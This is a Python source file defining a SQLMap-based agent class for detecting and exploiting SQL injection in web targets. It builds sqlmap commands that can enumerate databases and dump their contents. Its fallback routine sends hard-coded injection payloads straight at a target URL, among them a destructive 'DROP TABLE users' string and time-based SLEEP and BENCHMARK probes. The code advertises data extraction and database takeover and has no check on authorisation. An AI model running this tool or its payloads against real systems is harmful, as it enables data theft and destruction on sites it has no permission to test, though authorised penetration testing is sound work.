"""
SQLMap Agent - Advanced SQL Injection Detection and Exploitation
Professional SQL injection testing with 6 injection techniques and database takeover capabilities
"""

import asyncio
import json
import subprocess
import tempfile
import os
from typing import Dict, List, Any, Optional
from loguru import logger
from urllib.parse import urlparse

from agents.base import BaseAgent


class SQLMapAgent(BaseAgent):
    """
    Professional SQL Injection Detection and Exploitation Agent using SQLMap
    Advanced database security testing with comprehensive injection techniques
    """
    
    def __init__(self):
        super().__init__("sqlmap_agent")
        self.tool_path = os.path.expanduser("~/sqlmap/sqlmap.py")
        self.python_cmd = "python3"
        self.injection_techniques = ["B", "E", "U", "S", "T", "Q"]  # All techniques
        
    async def test_sql_injection(
        self,
        target: str,
        options: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """
        Test target for SQL injection vulnerabilities
        
        Args:
            target: Target URL to test
            options: Testing options (techniques, risk level, etc.)
            
        Returns:
            SQL injection test results with vulnerability details
        """
        logger.info(f"ðŸ’‰ Starting SQL injection testing for {target}")
        
        try:
            # Prepare sqlmap command
            cmd = [self.python_cmd, self.tool_path]
            
            # Add target URL
            cmd.extend(["-u", target])
            
            # Configure options
            if options:
                # Risk and level
                risk = options.get("risk", 1)  # 1-3
                level = options.get("level", 1)  # 1-5
                cmd.extend(["--risk", str(risk)])
                cmd.extend(["--level", str(level)])
                
                # Injection techniques
                techniques = options.get("techniques", "BEUSTQ")
                cmd.extend(["--technique", techniques])
                
                # Database operations
                if options.get("dbs"):
                    cmd.append("--dbs")
                if options.get("tables"):
                    cmd.append("--tables")
                if options.get("columns"):
                    cmd.append("--columns")
                if options.get("dump"):
                    cmd.append("--dump")
                
                # Authentication
                if options.get("cookie"):
                    cmd.extend(["--cookie", options["cookie"]])
                if options.get("headers"):
                    for header in options["headers"]:
                        cmd.extend(["-H", header])
                
                # POST data
                if options.get("data"):
                    cmd.extend(["--data", options["data"]])
                
                # Proxy
                if options.get("proxy"):
                    cmd.extend(["--proxy", options["proxy"]])
                
                # User agent
                if options.get("user_agent"):
                    cmd.extend(["--user-agent", options["user_agent"]])
                
                # Timeout
                timeout = options.get("timeout", 30)
                cmd.extend(["--timeout", str(timeout)])
                
                # Threads
                threads = options.get("threads", 1)
                cmd.extend(["--threads", str(threads)])
                
                # Output format
                cmd.extend(["--output-dir", "/tmp"])
                cmd.append("--flush-session")
                cmd.append("--batch")  # Non-interactive
                
            else:
                # Default safe configuration
                cmd.extend(["--risk", "1"])
                cmd.extend(["--level", "1"])
                cmd.extend(["--technique", "B"])  # Boolean-based blind
                cmd.extend(["--timeout", "30"])
                cmd.append("--batch")
                cmd.append("--flush-session")
            
            # Execute sqlmap
            logger.debug(f"Executing: {' '.join(cmd[:10])}... (truncated for security)")
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0 or "identified the following injection point" in stdout.decode():
                results = self._parse_sqlmap_output(stdout.decode(), stderr.decode())
                logger.info(f"âœ… SQL injection testing completed for {target}")
                
                return {
                    "success": True,
                    "target": target,
                    "vulnerabilities": results,
                    "timestamp": self._get_timestamp()
                }
            else:
                # Check if it's just "no injection found"
                output = stdout.decode() + stderr.decode()
                if "all tested parameters do not appear to be injectable" in output:
                    return {
                        "success": True,
                        "target": target,
                        "vulnerabilities": {
                            "injectable": False,
                            "message": "No SQL injection vulnerabilities found",
                            "parameters_tested": self._extract_tested_parameters(output)
                        },
                        "timestamp": self._get_timestamp()
                    }
                else:
                    error_msg = stderr.decode().strip()
                    logger.error(f"âŒ SQLMap testing failed: {error_msg}")
                    return {
                        "success": False,
                        "target": target,
                        "error": error_msg,
                        "timestamp": self._get_timestamp()
                    }
                
        except FileNotFoundError:
            logger.error("âŒ SQLMap not found - install from: https://github.com/sqlmapproject/sqlmap")
            return await self._fallback_sql_test(target, options)
        except Exception as e:
            logger.error(f"âŒ SQLMap testing error: {e}")
            return await self._fallback_sql_test(target, options)
    
    def _parse_sqlmap_output(self, stdout: str, stderr: str) -> Dict[str, Any]:
        """Parse SQLMap output for vulnerability information"""
        results = {
            "injectable": False,
            "injection_points": [],
            "database_info": {},
            "vulnerabilities": [],
            "techniques_used": [],
            "payloads": []
        }
        
        try:
            output = stdout + stderr
            lines = output.split('\n')
            
            for line in lines:
                line = line.strip()
                
                # Check for injection points
                if "identified the following injection point" in line.lower():
                    results["injectable"] = True
                
                # Extract parameter information
                if "Parameter:" in line:
                    param_info = line.split("Parameter:")[1].strip()
                    results["injection_points"].append(param_info)
                
                # Extract technique information
                if "Type:" in line:
                    technique = line.split("Type:")[1].strip()
                    results["techniques_used"].append(technique)
                
                # Extract payload information
                if "Payload:" in line:
                    payload = line.split("Payload:")[1].strip()
                    results["payloads"].append(payload)
                
                # Extract database information
                if "back-end DBMS:" in line.lower():
                    dbms_info = line.split(":")[-1].strip()
                    results["database_info"]["dbms"] = dbms_info
                
                # Extract version information
                if "web server operating system:" in line.lower():
                    os_info = line.split(":")[-1].strip()
                    results["database_info"]["os"] = os_info
                
                if "web application technology:" in line.lower():
                    tech_info = line.split(":")[-1].strip()
                    results["database_info"]["technology"] = tech_info
        
        except Exception as e:
            logger.debug(f"Error parsing SQLMap output: {e}")
        
        return results
    
    def _extract_tested_parameters(self, output: str) -> List[str]:
        """Extract list of parameters that were tested"""
        parameters = []
        try:
            lines = output.split('\n')
            for line in lines:
                if "testing" in line.lower() and "parameter" in line.lower():
                    # Extract parameter name
                    if "'" in line:
                        param = line.split("'")[1]
                        parameters.append(param)
        except:
            pass
        return list(set(parameters))  # Remove duplicates
    
    async def _fallback_sql_test(self, target: str, options: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Fallback SQL injection testing using basic payloads
        """
        logger.info(f"ðŸ”§ Using fallback SQL injection testing for {target}")
        
        try:
            import aiohttp
            
            # Basic SQL injection payloads
            payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' AND SLEEP(5)--",
                "' OR BENCHMARK(1000000,MD5(1))--"
            ]
            
            vulnerable_payloads = []
            
            async with aiohttp.ClientSession() as session:
                for payload in payloads:
                    try:
                        # Test with payload in URL parameter
                        test_url = f"{target}?id={payload}"
                        
                        async with session.get(test_url, timeout=10) as response:
                            response_text = await response.text()
                            
                            # Look for SQL error indicators
                            error_indicators = [
                                "mysql_fetch",
                                "ORA-",
                                "Microsoft OLE DB",
                                "ODBC SQL Server",
                                "PostgreSQL",
                                "Warning: mysql",
                                "MySQLSyntaxErrorException",
                                "valid MySQL result",
                                "check the manual that corresponds to your MySQL"
                            ]
                            
                            for indicator in error_indicators:
                                if indicator.lower() in response_text.lower():
                                    vulnerable_payloads.append({
                                        "payload": payload,
                                        "indicator": indicator,
                                        "response_code": response.status
                                    })
                                    break
                                    
                    except asyncio.TimeoutError:
                        # Timeout might indicate time-based injection
                        if "SLEEP" in payload or "BENCHMARK" in payload:
                            vulnerable_payloads.append({
                                "payload": payload,
                                "indicator": "timeout_based",
                                "response_code": "timeout"
                            })
                    except:
                        continue
            
            results = {
                "injectable": len(vulnerable_payloads) > 0,
                "method": "fallback_payload_testing",
                "vulnerable_payloads": vulnerable_payloads,
                "total_payloads_tested": len(payloads)
            }
            
            return {
                "success": True,
                "target": target,
                "vulnerabilities": results,
                "timestamp": self._get_timestamp()
            }
            
        except Exception as e:
            logger.error(f"âŒ Fallback SQL testing failed: {e}")
            return {
                "success": False,
                "target": target,
                "error": f"Fallback testing failed: {str(e)}",
                "timestamp": self._get_timestamp()
            }
    
    async def execute(self, target: str, config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Main execution method required by BaseAgent"""
        return await self.test_sql_injection(target, config)
    
    async def database_enumeration(
        self,
        target: str,
        options: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """
        Perform database enumeration on vulnerable target
        """
        logger.info(f"ðŸ—ƒï¸ Starting database enumeration for {target}")
        
        # First test for injection
        injection_result = await self.test_sql_injection(target, options)
        
        if not injection_result.get("success") or not injection_result.get("vulnerabilities", {}).get("injectable"):
            return {
                "success": False,
                "target": target,
                "error": "No SQL injection vulnerability found - enumeration not possible",
                "timestamp": self._get_timestamp()
            }
        
        # Perform enumeration
        enum_options = options.copy() if options else {}
        enum_options.update({
            "dbs": True,
            "tables": True,
            "risk": 2,
            "level": 2
        })
        
        return await self.test_sql_injection(target, enum_options)
    
    def get_scan_info(self) -> Dict[str, Any]:
        """Get information about this scanning agent"""
        return {
            "name": "SQLMap Advanced SQL Injection Agent",
            "description": "Professional SQL injection detection and exploitation with database takeover capabilities",
            "capabilities": [
                "SQL Injection Detection",
                "6 Injection Techniques (Boolean, Error, Union, Stacked, Time, Query)",
                "Database Enumeration",
                "Data Extraction",
                "Database Takeover",
                "Multi-DBMS Support",
                "Advanced Evasion Techniques",
                "Custom Payload Generation"
            ],
            "supported_databases": ["MySQL", "PostgreSQL", "Oracle", "Microsoft SQL Server", "SQLite", "Access", "Firebird", "Sybase", "SAP MaxDB", "IBM DB2"],
            "injection_techniques": ["Boolean-based blind", "Error-based", "Union query", "Stacked queries", "Time-based blind", "Inline queries"],
            "output_formats": ["structured", "json"],
            "tool_version": "sqlmap",
            "agent_version": "1.0.0"
        }


